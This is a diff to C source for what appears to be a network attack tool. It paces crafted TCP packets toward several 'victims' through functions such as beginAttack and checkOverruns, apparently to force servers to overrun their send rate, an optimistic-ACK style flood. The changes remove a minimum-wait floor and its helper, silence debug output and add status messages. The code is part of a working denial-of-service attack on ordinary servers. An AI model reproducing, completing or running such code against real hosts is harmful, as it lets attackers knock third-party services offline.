@@ -21,7 +21,6 @@
 #define wscale (4)
 #define client_bw (1544000.0)
 #define maxwindow (240000)
-#define min_wait (0.00024870466321243526)
 
 //Pseudo header needed for calculating the TCP header checksum
 struct pseudoTCPPacket {
@@ -56,13 +55,6 @@ struct pace_args {
 };
 
 void processOverruns(unsigned seq, struct victim_connection *m_victim);
-
-double d_max(double a, double b) {
-    if (a > b)
-      return a;
-    return b;
-}
-
 
 // TODO I DONT THINK THIS IS NECESSARY
 //Debug function: dump 'index' bytes beginning at 'buffer'
@@ -366,7 +358,7 @@ void *checkOverruns(void *vargp) {
 
       for (i = 0; i < m_args->num_victims && current_time.tv_sec - start_time.tv_sec <= m_args->duration; i++) {
 
-        printf("Waiting to receive packet from host %d\n", i);
+        //printf("Waiting to receive packet from host %d\n", i);
         unsigned read_seq = read_packet(&(m_args->m_victims[i]),
                                           m_args->socket,
                                           m_args->m_victims,
@@ -382,6 +374,8 @@ void *checkOverruns(void *vargp) {
 }
 
 int beginAttack(int duration, double target_rate, int num_victims) {
+    sleep(1);
+    printf("Beginning with %d victims. Please wait 30 seconds.\n", num_victims);
 
     // local variables
     int sock, i;
@@ -487,8 +481,7 @@ int beginAttack(int duration, double target_rate, int num_victims) {
         double elapsed_seconds = (after_sent.tv_sec - before_sent.tv_sec) +
                           1.0e-6 * (after_sent.tv_usec - before_sent.tv_usec);
 
-        double secsToWait = d_max(min_wait,
-                            currConnection->window / (curr_rate * num_victims));
+        double secsToWait = currConnection->window / (curr_rate * num_victims);
 
         secsToWait -= elapsed_seconds;
 
@@ -532,21 +525,22 @@ int beginAttack(int duration, double target_rate, int num_victims) {
                   0);                           // w_scale
 
     }
-    printf("Waiting to join\n");
+    //printf("Waiting to join\n");
     pthread_join(tid, NULL);
 
-    printf("Joined with other thread\n");
+    //printf("Joined with other thread\n");
     for (i = 0; i < num_victims; i++ ) {
       pthread_mutex_destroy(&(m_victims[i].lock));
     }
 
     close(sock);
+    printf("Completed\n");
 }
 
 
 
 int main(int argc, char const *argv[]) {
-  printf("In Main: About to begin:");
+  //printf("In Main: About to begin:");
   // TODO, more arguments will be provided as the ip and ports of victims
 
   int num_victims = atoi(argv[1]);
